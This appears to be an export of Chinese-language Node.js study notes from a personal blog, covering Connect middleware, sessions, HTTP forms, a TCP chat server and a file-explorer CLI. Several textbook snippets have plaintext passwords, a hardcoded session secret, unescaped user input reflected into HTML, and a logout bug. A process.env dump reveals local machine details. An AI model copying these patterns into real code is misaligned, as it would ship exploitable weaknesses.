请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; // ... return function(req, res, next) &#123; //... next(); &#125;&#125; 实现12345678910111213141516171819202122232425262728/** * 请求时间中间件 * * 选项： * -'time'('Number')：超时阈值(默认100ms) * * @param &#123;Object&#125; options * @api public */module.exports = function (opts) &#123; var time = opts.time || 100; return function (req, res, next) &#123; var timer = setTimeout(function () &#123; console.log('\\033[90m%s %s\\033[39m \\033[91mis taking too long!\\033[39m', req.method, req.url); &#125;, time); //这个技巧称为 重写方法/猴子补丁(monkey-patch) //将原本的方法置换为包含原本方法的函数，在其他的地方调用这个被置换过的方法时，被置换的方法方法可以在执行原来方法的同时执行一些别的方法 var end = res.end; res.end = function (chunk, encoding) &#123; res.end = end; res.end(chunk, encoding); clearTimeout(timer); &#125;; next(); &#125;;&#125;; 测试123456789101112131415161718192021222324252627282930313233343536373839var connect = require('connect');var time = require('./request-time');var morgan = require('morgan');var fs = require('fs');var app = connect();// create a write stream (in append mode)var accessLogStream = fs.createWriteStream(__dirname + 'access.log', &#123; flags: 'a' &#125;); // setup the loggerapp.use(morgan('combined', &#123; stream: accessLogStream &#125;));app.use(time(&#123;time: 500&#125;));/** * 快速响应 */app.use(function(req, res, next) &#123; if('/a' == req.url) &#123; res.writeHead(200); res.end('Fast!'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if('/b' == req.url) &#123; setTimeout(function () &#123; res.writeHead(200); res.end('Slow!'); &#125;, 1000); &#125; else &#123; next(); &#125;&#125;);app.listen(3000); 中间件-举例static(现在改名为serve-static) static允许将任意一个url匹配到文件系统中任意一个目录 1server.use(serveStatic(__dirname + 'website')); // app.use() 这种起名方式貌似比较好 自己测试发现，托管是动态托管，非常nb 参数 maxAge 一个资源在客户端缓存的时间(ms)，在此期间内文件内容将被缓存起来，改动则不会被再缓存 query中间件 现在已经被qs(querystring)替代，默认在express中启用 logger中间件 将发送进来的请求和发送出去的响应信息打印在终端(可配置打印在日志文件中) 1server.use(logger('dev')); body parser中间件 书上的方法已经过时，这里是自己探索出的使用方法 123456789101112131415161718192021222324252627//部分代码,已经测试过可行var bodyParser = require('body-parser');var jsonParser = bodyParser.json();var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);//可以x-www-form-urlencoded，也就是表单数据var app = connect();app.use(urlencodedParser);app.use(function (req, res, next) &#123; if (req.url == '/x-www-form-urlencoded' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;);app.use(jsonParser);app.use(function (req, res, next) &#123; if (req.url == '/raw-json' &amp;&amp; req.method == 'POST') &#123; console.log(req.body); res.writeHead(200); res.end('success'); &#125; else &#123; next(); &#125;&#125;); 会话(session)json文件 123456&#123; \"tobi\": &#123; \"password\":\"ferret\", \"name\": \"Tobi Holowaychuk\" &#125;&#125; 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687var connect = require('connect'), users = require('./users.json'), logger = require('morgan'), bodyParser = require('body-parser'), cookieParser = require('cookie-parser'), session = require('express-session');//这里直接Require了json文件，当你对外暴露数据时，不需要加上module.exports，直接把数据以json形式暴露出来就可以了(技巧-暴露数据可以用json文件)var urlencodedParser = bodyParser.urlencoded(&#123; extended: false &#125;);var app = connect();app.use(urlencodedParser);app.use(logger('dev'));app.use(cookieParser());app.use(session(&#123; secret: \"my app secret\", resave: true, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;));app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; req.session.logged_in) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end('Welcome back, &lt;b&gt;' + req.session.name + '&lt;b&gt;' + '&lt;a href = \"/logout\"&gt;Logout&lt;/a&gt;'); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/' == req.url &amp;&amp; 'GET' == req.method) &#123; res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end([ '&lt;form action = \"/login\" method = \"post\"&gt;', '&lt;fieldset&gt;', '&lt;legend&gt;please log in&lt;/legend&gt;', '&lt;p&gt;user: &lt;input type=\"text\" name=\"user\"&gt;&lt;/p&gt;', '&lt;p&gt;password: &lt;input type=\"password\" name=\"password\"&gt;&lt;/p&gt;', '&lt;button&gt;Submit&lt;/button&gt;', '&lt;fieldset&gt;', '&lt;/form&gt;' ].join('')); &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/login' == req.url &amp;&amp; 'POST' == req.method) &#123; res.writeHead(200); console.log(req.body); console.log(users); if (!users[req.body.user] || req.body.password != users[req.body.user].password) &#123; res.end('Bad username/password'); &#125; else &#123; //注意是req //该对象的session在响应发送出去时会自动保存，无需手动处理 req.session.logged_in = true; req.session.name = users[req.body.user].name; res.end('Authenticated!'); console.log(req.session.name); &#125; &#125; else &#123; next(); &#125;&#125;);app.use(function (req, res, next) &#123; if ('/logout' == req.url &amp;&amp; req.method == 'GET') &#123; console.log(req.session.name); if (req.session.logged_in) &#123; req.session.logged_in == false; res.writeHead(200); res.end('logged out!'); &#125; else &#123; res.writeHead(200); res.end('Have not logged!'); &#125; &#125; else &#123; next(); &#125;&#125;);app.listen(3000); Redis session 将session存入数据库，将session脱离进程 12345678910var redis = require('redis');//持久化存储var RedisStore = require('connect-redis')(session);//持久化存储var redisClient = redis.createClient();//持久化存储app.use(session(&#123; store: new RedisStore(&#123;client: redisClient&#125;),//持久化存储 secret: \"my app secret\", resave: false, saveUninitialized: true//这里一定要加上去，否则会存不住session&#125;)); basicAuth中间件 对客户端进行基本的身份验证 e.g:一个简单的身份验证系统 12","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"7.HTTP --TCP上层的超文本传输协议","date":"2020-09-29T11:12:24.000Z","path":"2020/09/29/coding/nodeJs/7. HTTP/","text":"HTTP —TCP上层的超文本传输协议HTTP结构 12345require('http').createServer(function (req, res) &#123; res.writeHead(200); res.end('Hello World');&#125;).listen(3000); 1234567HTTP / 1.1 200 OKDate: Mon, 31 Aug 2020 22: 57: 14 GMTConnection: keep - aliveTransfer - Encoding: chunkedbHello World0 头信息 “Content-Type” 文本类型：text/plain 普通文本 text/html 富文本 “Transfer-Encoding” 头信息默认值 chunked(使得响应逐步产生) “Connection” 连接状态 keep-alive 保持连接，不用重复连接TCP 流 管道 的应用(两者等效) ```javascriptrequire(‘fs’).createReadStream(‘image.png’).pipe(res); 123456789- ```javascript var stream = require(&apos;fs&apos;).createReadStream(&apos;image.png&apos;); stream.on(&apos;data&apos;, function () &#123; res.write(&apos;data&apos;); &#125;); stream.on(&apos;end&apos;, function () &#123; res.end(); &#125;) 连接 TCP连接：connection对象 http连接：req, res对象 在http连接中获取tcp连接：req.connection(不常用) 处理用户提交的表单 创建模块 12345&#123; \"name\": \"http-form\", \"description\": \"An HTTP server that processes forms\", \"version\": \"0.0.1\"&#125; 表单 123456789101112131415161718require('http').createServer(function (req, res) &#123; if('/' == req.url) &#123; res.writeHead(200, &#123;\"Content-Type\": \"text/html\"&#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url) &#123; res.writeHead(200, &#123;'Content-Type': \"text/html\"&#125;); res.end('You sent a &lt;em?&gt;' + req.method + '&lt;/em? request'); &#125;&#125;).listen(3000); method 123456789101112131415161718192021222324require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); res.end('&lt;p&gt;Content-Type: ' + req.headers['content-type'] + '&lt;/p&gt;' + '&lt;p&gt;Data: &lt;/p&gt;&lt;pre&gt;' + body + '&lt;/pre&gt;'); &#125;); &#125;&#125;).listen(3000); url querystring对url进行处理 12console.log(require('querystring').parse('name=Guillermo'));console.log(require('querystring').parse('q=guillermo+rauch')); 12[Object: null prototype] &#123; name: &apos;Guillermo&apos; &#125;[Object: null prototype] &#123; q: &apos;guillermo rauch&apos; &#125; 整合12345678910111213141516171819202122232425262728293031var qs = require('querystring');require('http').createServer(function (req, res) &#123; if ('/' == req.url) &#123; res.writeHead(200, &#123; \"Content-Type\": \"text/html\" &#125;); res.end([ '&lt;form method=\"POST\" action=\"url\" ', '&lt;h1&gt;My form&lt;/h1&gt;', '&lt;fieldset&gt;', '&lt;label&gt;Personal information&lt;/label&gt;', '&lt;p&gt;What is your name?&lt;/p&gt;', '&lt;input type=\"text\" name=\"name\"', '&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;', '&lt;/form&gt;' ].join('')); &#125; else if ('/url' == req.url &amp;&amp; 'POST' == req.method) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200, &#123; 'Content-Type': \"text/html\" &#125;); //使用querystring处理 res.end('&lt;p&gt;Your name is &lt;b&gt;' + qs.parse(body).name + '&lt;/b&gt;&lt;/p&gt;'); &#125;); &#125; else &#123; //404处理 res.writeHead(404); res.end('Not Found'); &#125;&#125;).listen(3000); 一个Twitter Web客户端 创建模块 123456&#123; \"name\": \"tweet-client\", \"description\": \"An HTTP tweets client\", \"version\": \"0.0.1\"&#125; 发送一个简单的http请求123456789101112131415require('http').request(&#123;//初始化一个新的http.Client Request对象 host: '127.0.0.1', port: 3000, url: '/', method: 'GET'&#125;, function (res) &#123; var body = \"\"; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function() &#123; console.log('\\r\\n We got: \\033[96m' + body + '\\033[39m\\r\\n'); &#125;)&#125;).end();//调用end(): 原因是创建完一个请求之后，在发送给服务器前还可以和request对象进行交互 1We got: &lt;form method=&quot;POST&quot; action=&quot;url&quot; &lt;h1&gt;My form&lt;/h1&gt;&lt;fieldset&gt;&lt;label&gt;Personal information&lt;/label&gt;&lt;p&gt;What is your name?&lt;/p&gt;&lt;input type=&quot;text&quot; name=&quot;name&quot;&lt;p&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;/p&gt;&lt;/form&gt; 模拟一次请求 服务端 1234567891011121314var qs = require('querystring');require('http').createServer(function (req, res) &#123; var body = ''; req.on('data', function (chunk) &#123; body += chunk; &#125;); req.on('end', function () &#123; res.writeHead(200); res.end('done'); console.log('\\r\\n got name \\033[90m' + qs.parse(body).name + '\\033[39m\\r\\n'); &#125;);&#125;).listen(3000); 客户端 12345678910111213141516171819202122232425262728var http = require('http');var qs = require('querystring');function send(theName) &#123; http.request(&#123; host: '127.0.0.1', port: 3000, url: '/', method: 'POST' &#125;, function (res) &#123; res.setEncoding('utf8'); //自己注册的事件，end事件在测试中发现需要先注册data事件 res.on('data', function (data) &#123; console.log(\"Data: \" + data); &#125;) res.on('end', function () &#123; console.log('\\r\\n \\033[90m request complete!\\033[39m'); process.stdout.write('\\r\\n your name: '); &#125;); &#125;).end(qs.stringify(&#123;name: theName&#125;));&#125;process.stdout.write('\\r\\n your name: ');process.stdin.resume();process.stdin.setEncoding('utf-8');process.stdin.on('data', function (name) &#123; send(name.replace('\\n', ''));&#125;) 获取推文123456789101112131415161718192021222324252627var qs = require('querystring');var http = require('http');var search = process.argv.slice(2).join(' ').trim();if (!search.length) &#123; return console.log('\\r\\n Usage: node tweets &lt;search term&gt;\\r\\n');&#125;console.log('\\r\\n searching for: \\033[96m' + search + '\\033[39m\\r\\n');http.request(&#123; //also http.get(obj, func);(这种方法不用.end()) host: 'search.twitter.com', path: '/search.json?' + qs.stringify(&#123; q: search &#125;)&#125;, function (res) &#123; var body = ''; res.setEncoding('utf8'); res.on('data', function (chunk) &#123; body += chunk; &#125;); res.on('end', function () &#123; var obj = JSON.parse(body); obj.results.forEach(function (tweet) &#123; console.log(' \\033[90m' + tweet.text + '\\033[39m'); console.log(' \\033[94m' + TreeWalker.from_user + '\\033[39m'); console.log('--'); &#125;); &#125;);&#125;).end(); superagent(客户端) 1npm install superagent 1234var request = require('superagent');request.get('http://twitter.com/search.json') .send(&#123; q: 'justin bieber' &#125;) .end(function (res) &#123; console.log(res.body) &#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"6.TCP服务器","date":"2020-09-29T11:11:24.000Z","path":"2020/09/29/coding/nodeJs/6. TCP服务器 在线聊天应用/","text":"TCP服务器 创建TCP服务器 使用telnet测试创建1234require('http').createServer(function (req, res) &#123; res.writeHead(200, &#123;'Content-Type': 'text/html'&#125;); res.end('&lt;h1&gt;hello world&lt;/h1&gt;');&#125;).listen(3000); 测试1234567891011121314telnet 127.0.0.1 3000(ctrl + ] 接回车)GET / HTTP / 1.1HTTP / 1.1 200 OKContent - Type: text / htmlDate: Mon, 31 Aug 2020 01: 42: 05 GMTConnection: keep - aliveTransfer - Encoding: chunked14&lt;h1&gt; hello world&lt;/h1&gt;0 一个聊天应用需求 成功连接到服务器后，服务器会显示欢迎信息，并要求输入用户名，同时还会告诉你当前还有多少其他客户端也连接到了服务器 输入用户名，按下回车后，即认为已经连接上了服务器 连接之后，输入信息按下回车，向其他客户端进行消息的收发 按下回车相当于输入了 \\n 字符，在node服务器端，通过\\n来判断消息是否已完全到达 创建模块12345&#123; \"name\": \"tcp-chat\", \"description\": \"Our first TCP server\", \"version\": \"0.0.1\"&#125; 创建服务器12345678910111213141516171819/** * 模块依赖 */ var net = require('net'); /** * 创建服务器 */ var server = net.createServer(function (conn) &#123; //handle connection console.log('\\033[90m new connection!\\033[39m'); &#125;) /** * 监听 */ server.listen(3000, function()&#123; console.log('\\033[96m server listening on *:3000\\033[39m'); &#125;) 接收连接1234567891011121314151617181920212223var count = 0;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); conn.on('data', function (data) &#123; //如果没有设置编码，接收到的数据将会是一个Buffer console.log(data); &#125;) //底层套接字关闭时，Node.js会触发close事件(end事件：当客户端显示关闭TCP连接时触发，当发生error事件时end事件不会触发，不过发生error / end事件时close事件都会触发) conn.on('close', function () &#123; count--; &#125;);&#125;); 创建用户数组，添加通知1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/** * 模块依赖 */var net = require('net');//count计数器称为状态，在本例中，两个不同连接的用户需要修改同一个状态变量，这时称为共享状态的并发var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\n &gt; ' + count + ' other people are connected at this time.' + '\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); //昵称 var nickname; conn.on('data', function (data) &#123; if(!nickname) &#123; //第一份输入的数据是nickname if(users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; for(var i in users) &#123; users[i].write('\\033[90m &gt; ' + nickname + ' joined the room\\033[39m\\n'); &#125; &#125; &#125; else &#123; for(var i in users) &#123; if(i != nickname) &#123; //消息通知其他人 users[i].write('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\n'); &#125; &#125; &#125; &#125;) conn.on('close', function () &#123; count--; &#125;);&#125;);/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 完成1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/** * 模块依赖 */var net = require('net');var count = 0, users = &#123;&#125;;/** * 创建服务器 */var server = net.createServer(function (conn) &#123; conn.write( '\\r\\n &gt; welcome to \\033[92m node-chat\\033[39m!' + '\\r\\n &gt; ' + count + ' other people are connected at this time.' + '\\r\\n &gt; please write your name and press enter: ' ); count++; conn.setEncoding('utf8'); var nickname; //发现data事件在自己这里是一个字符一个字符输出的，所以就做了个存储 var data = \"\"; conn.on('data', function (chunk) &#123; if (chunk === \"\\r\\n\") &#123; if (!nickname) &#123; if (users[data]) &#123; conn.write('\\033[930&gt; nickname already in use. try again:\\033[39m '); return; &#125; else &#123; nickname = data; users[nickname] = conn; broadcast('\\033[90m &gt; ' + nickname + ' joined the room\\033[39m\\r\\n', nickname); &#125; &#125; else &#123; broadcast('\\033[96m &gt; ' + nickname + ':\\033[39m ' + data + '\\r\\n', nickname, true); &#125; data = \"\"; &#125; else &#123; data += chunk; &#125; &#125;) conn.on('close', function () &#123; count--; delete users[nickname]; broadcast('\\033[96m &gt; ' + nickname + ' left the room\\033[39m\\r\\n', nickname); &#125;);&#125;);function broadcast(msg, nickname, exceptMyself = false) &#123; for (var i in users) &#123; if (!exceptMyself || i != nickname) &#123; users[i].write(msg); &#125; &#125;&#125;/** * 监听 */server.listen(3000, function () &#123; console.log('\\033[96m server listening on *:3000\\033[39m');&#125;) 一个IRC(Internet Relay Chat)客户端程序突然发现一个神奇的快捷键—VS CODE ctrl + shift + C，调出cmd 创建模块12345 &#123; \"name\": \"irc-client\", \"description\": \"Our first TCP client\", \"version\": \"0.0.1\"&#125; 理解NET#STREAM API 1net.connect(port, [[, host], callback]); 1234567//e.g.: net.connect(3000, 'localhost', function () &#123; &#125;);/* EQUAL TOvar client = net.connect(3000, 'localhost');client.on(\"connect\", function () &#123; &#125;);//同样可以监听data与close事件*/ 完成123456789var net = require('net');var client = net.connect(6667, 'irc.freenode.net');client.setEncoding('utf-8');client.on('connect', function() &#123; client.write('NICK mynick\\r\\n'); client.write('USER mynick 0 * :realname\\r\\n'); client.write('JOIN #node.js\\r\\n');&#125;);console.log(client);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"5.CLI以及FS API","date":"2020-09-29T11:10:24.000Z","path":"2020/09/29/coding/nodeJs/5. CLI以及FS API 第一个node.js程序 - 命令行程序/","text":"NODE.JS 为什么要记这个笔记？ 在以前的实战项目中，发现自己的忘性很大，经常忘记函数名以及使用方法，所以在这次的node.js学习之路中，想记一点笔记以自用。 记些什么？ 不记基础和起步内容，记一些重要的模块的api函数以及用法，以及一些JavaScript的巧妙用法。 所采用的书籍？ 《了不起的Node JS 将JavaScript进行到底》 补： 此系列与2020年9月初编写，本想使用node搭建一个项目再发布这些文章，奈何写出来自觉没有hexo的主题好看，因此自行删除不是，打算之后把我的项目展示出来以供参考。 CLI以及FS API 第一个node.js程序 - 命令行程序 需求1. 程序在命令行运行，意味着程序要么通过node命令运行，要么直接执行，通过终端提供交互给用户进行输入输出。 2. 启动后需要显示当前目录的列表 3. 选取某个文件后，显示该文件的内容 4. 选择某个目录后，显示该目录下的信息 5. 运行结束后程序退出 步骤 创建模块 决定使用同步/异步fs 流(stream) 实现输入输出 重构 使用fs进行文件交互 完成 开始声明一个自己的项目(package.json) 12345&#123; \"name\": \"file-explorer\", \"version\": \"0.0.1\", \"description\": \"A command-file file explorer!\"&#125; fs模块 引入(fs是模块唯一一个同时提供异步和同步API的模块) 1234var fs = require('fs');fs.readdir(__dirname, function (err, files) &#123; console.log(files); &#125;); 第一份代码(从显示文件/目录到输入操作)123456789101112131415161718192021222324252627282930313233var fs = require('fs');fs.readdir(process.cwd(), function (err, files) &#123; console.log('');//为了输出更加友好，首先输出一个空行 if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n');//\\033[31m 与 \\033[39m 是为了让文本呈现为红色 &#125; console.log(' Select which file or directory you want to see\\n'); //第一种异步流控制模式-串行 function file(i) &#123; var filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123;//fs.stat会给出文件/目录元数据 if (stat.isDirectory()) &#123;//目录与文件的颜色不同 console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; i++; if (i == files.length) &#123;//没有未处理的文件 console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m');//console.log是这个函数的封装，多了个换行符 process.stdin.resume();//等待用户输入 process.stdin.setEncoding('utf8');//设置流编码为utf8 //... &#125; else &#123; file(i); &#125; &#125;); &#125; file(0);&#125;); 重构一下12345678910111213141516171819202122232425262728293031323334353637383940414243var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, files = [], filename; function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function(err, stat) &#123; if(stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if(++i == files.length) &#123; //递归结束调用read读取 read(); &#125; else &#123; file(i); &#125; &#125;); &#125; function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); //... &#125; fs.readdir(process.cwd(), function (err, filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0); &#125;); 处理输入的事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, //书上的教程默认在上一个函数中定义的所有参数可以在下一个函数中自由使用，实际说明不可以 files = [], filename, stats = [];fs.readdir(process.cwd(), function (err, filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0);&#125;);function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出读取函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123; stats[i] = stat; if (stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if (++i == files.length) &#123; read(); &#125; else &#123; file(i); &#125; &#125;);&#125;function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); stdin.on('data', option);//监听data事件(继承了eventEmitter事件)，并且设置监听函数为option&#125;function option(data) &#123; //检查函数，检查是否命中下标 if (!files[Number(data)]) &#123; /** * 1. 这里可以使用files，在其作用域范围内 (fs.readdir函数的回调函数的一部分) * 2. Number(var) 强制转换 */ stdout.write(' \\033[31Enter your choice: \\033[39m'); &#125; else &#123; stdin.pause();//将流暂停(回到默认状态) if (stats[Number(data)].isDirectory()) &#123; fs.readdir(__dirname + '/' + filename, function(err, files) &#123; console.log(''); console.log(' (' + files.length + ' files)'); files.forEach(function (file) &#123; console.log(' - ' + file); &#125;); console.log(''); &#125;) &#125; else &#123; fs.readFile(__dirname + '/' + filename, 'utf8', function (err, data) &#123; console.log(''); console.log('\\033[90m' + data.replace(/(.*)/g, ' $1') + '\\033[39m');//正则表达式添加一些辅助缩进 &#125;); &#125; &#125;&#125; 反思 - CLI的一些常用接口argv process.argv 所有node程序运行时的参数值 1console.log(process.argv);// 除去两个常用参数 =&gt; process.argv.slice(2) 12345[ &apos;C:\\\\Program Files\\\\nodejs\\\\node.exe&apos;, &apos;C:\\\\Users\\\\v25bh\\\\Desktop\\\\node.js\\\\nodejs-note\\\\file-explorer\\\\example.js&apos;, &apos;temp&apos;] 工作目录 1__dirname //执行文件在文件系统中所在的目录 1process.cwd() //获取当前目录 1process.chdir(&apos;/&apos;) //灵活改变目录 环境变量 1process.env //访问shell环境下的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#123; ALLUSERSPROFILE: 'C:\\\\ProgramData', APPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming', 'asl.log': 'Destination=file', CLASSPATH: '.;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\dt.jar;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\tools.jar;', CommonProgramFiles: 'C:\\\\Program Files\\\\Common Files', 'CommonProgramFiles(x86)': 'C:\\\\Program Files (x86)\\\\Common Files', CommonProgramW6432: 'C:\\\\Program Files\\\\Common Files', COMPUTERNAME: 'LAPTOP-TLHLP7T6', ComSpec: 'C:\\\\WINDOWS\\\\system32\\\\cmd.exe', configsetroot: 'C:\\\\WINDOWS\\\\ConfigSetRoot', DriverData: 'C:\\\\Windows\\\\System32\\\\Drivers\\\\DriverData', FPS_BROWSER_APP_PROFILE_STRING: 'Internet Explorer', FPS_BROWSER_USER_PROFILE_STRING: 'Default', HOMEDRIVE: 'C:', HOMEPATH: '\\\\Users\\\\v25bh', JAVA_HOME: 'C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131', LOCALAPPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local', LOGONSERVER: '\\\\\\\\LAPTOP-TLHLP7T6', NUMBER_OF_PROCESSORS: '8', OneDrive: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OneDriveConsumer: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OS: 'Windows_NT', Path: 'C:\\\\Program Files (x86)\\\\Common Files\\\\Oracle\\\\Java\\\\javapath;C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\Wbem;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\Windows\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files (x86)\\\\NVIDIA Corporation\\\\PhysX\\\\Common;C:\\\\Program Files\\\\NVIDIA Corporation\\\\NVIDIA NvDLISR;D:\\\\Git\\\\cmd;D:\\\\php-7.3.10-Win32-VC15-x64;E:\\\\MaINECRAFT\\\\WorldPainter;D:\\\\php-7.3.10-Win32-VC15-x64\\\\php.exe;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\bin;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\jre\\\\bin;C:\\\\WINDOWS\\\\system32;C:\\\\WINDOWS;C:\\\\WINDOWS\\\\System32\\\\Wbem;C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\WINDOWS\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;D:\\\\Microsoft VS Code\\\\bin;C:\\\\Program Files\\\\Java\\\\jre1.8.0_221\\\\bin;D:\\\\Vagrant\\\\bin;C:\\\\Program Files\\\\PuTTY\\\\;C:\\\\Program Files\\\\dotnet\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\130\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\Client SDK\\\\ODBC\\\\170\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\nodejs\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;;D:\\\\Microsoft VS 